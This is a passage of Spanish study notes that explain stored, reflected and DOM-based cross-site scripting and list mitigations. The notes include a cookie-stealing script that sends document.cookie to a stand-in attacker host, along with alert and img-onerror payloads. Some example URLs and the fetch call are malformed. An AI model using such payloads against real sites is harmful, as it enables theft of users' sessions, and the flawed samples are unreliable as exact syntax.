    * Permite manipular la estructura del sitio web en tiempo real.
    * Si no se valida la entrada del usuario, un atacante puede tomar el control del navegador.

## Cross-Site Scripting (XSS)

Ocurre cuando una aplicación web incluye datos no confiables en una página web sin la validación o el cifrado adecuados, permitiendo la ejecución de scripts en el navegador de la víctima.

### 1. XSS Almacenado (Stored / Persistent XSS)
El script malicioso se guarda permanentemente en el servidor (bases de datos, foros, comentarios, perfiles).

* **Flujo:** Atacante guarda script \(\rightarrow\) Servidor lo almacena \(\rightarrow\) Víctima carga la página \(\rightarrow\) Script se ejecuta.
* **Ejemplo de vulnerabilidad:** Un comentario en un blog que guarda directamente el texto introducido por el usuario.
* **Código de ataque:**
  ```html
  <script>fetch('http://atacante.com' + document.cookie);</script>
  ```

### 2. XSS Reflejado (Reflected / Non-Persistent XSS)
El script malicioso se propaga a través de la solicitud HTTP actual. No se guarda en el servidor; se "refleja" de inmediato.

* **Flujo:** Atacante envía enlace malicioso \(\rightarrow\) Víctima hace clic \(\rightarrow\) Servidor recibe la petición y la devuelve en la respuesta sin limpiar \(\rightarrow\) Script se ejecuta.
* **Ejemplo de vulnerabilidad:** Un motor de búsqueda que muestra el mensaje: *"Resultados para: [Texto_Buscado]"*.
* **Código de ataque (vía URL):**
  ```text
  http://vulnerable.com<script>alert('XSS Reflejado')</script>
  ```

### 3. XSS Basado en DOM (DOM-based XSS)
La vulnerabilidad existe completamente en el código del lado del cliente (Frontend). El servidor nunca llega a ver el script malicioso.

* **Flujo:** Atacante manipula una fuente del DOM (como la URL) $\rightarrow$ El código JavaScript del sitio web procesa ese dato de forma insegura $\rightarrow$ El script se ejecuta directamente en el navegador.
* **Ejemplo de vulnerabilidad:** Un script que lee la URL y usa `innerHTML` para escribir el nombre del usuario en la pantalla.
* **Código de ataque:**
  ```javascript
  // Código vulnerable en la página:
  const params = new URLSearchParams(window.location.search);
  document.getElementById("saludo").innerHTML = params.get("nombre");

  // URL del atacante:
  // http://vulnerable.com<img src=x onerror=alert('DOM_XSS')>
  ```

## Medidas de Mitigación (¿Cómo protegerse?)

1. **Sanitización de Entradas:** Filtrar y limpiar cualquier dato que introduzca el usuario antes de procesarlo.
2. **Context-Aware Context Encoding (Escapado de datos):** Convertir caracteres peligrosos en entidades seguras antes de renderizarlos (ej. transformar `<` en `&lt;` y `>` en `&gt;`).
3. **Uso de APIs seguras en el DOM:** Preferir siempre `textContent` o `innerText` en lugar de `innerHTML`.
4. **Content Security Policy (CSP):** Configurar cabeceras HTTP que restrinjan qué scripts externos o de qué fuentes se pueden ejecutar en el sitio web.
